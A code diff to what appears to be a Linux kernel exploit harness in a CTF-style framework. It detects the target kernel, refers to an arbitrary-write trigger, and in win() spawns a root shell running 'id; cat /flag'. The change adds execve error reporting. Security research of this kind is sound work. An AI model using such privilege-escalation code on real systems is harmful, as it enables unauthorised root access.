@@ -1,6 +1,7 @@
 #include <stdio.h>
 
 #include <cassert>
+#include <cerrno>
 #include <target/TargetDb.cpp>
 #include <test/kpwn/Kpwn.cpp>
 #include <util/incbin.cpp>
@@ -61,12 +62,13 @@ void trigger_vuln_arb_write(uint64_t addr, const std::vector<uint8_t>& data) {
 void win() {
     puts("[+] Returned from kernel");
     puts("[+] Testing access as root:");
-    const char *sh_args[] = {"sh", "-c", "id; cat /flag"};
-    execve("/bin/sh", (char**)sh_args, NULL);
+    const char *sh_args[] = {"sh", "-c", "id; cat /flag; sleep 1"};
+    int ret = execve("/bin/sh", (char**)sh_args, NULL);
+    puts("[-] Still running after execve...");
+    printf("[-] execve ret = %d, errno = %d\n", ret, errno);
 }
 
 int main(int argc, const char** argv) {
-
     TargetDb kpwn_db(target_db, target_db_size);
     auto target = kpwn_db.AutoDetectTarget();
     printf("[+] Running on target: %s %s\n", target.distro.c_str(), target.release_name.c_str());
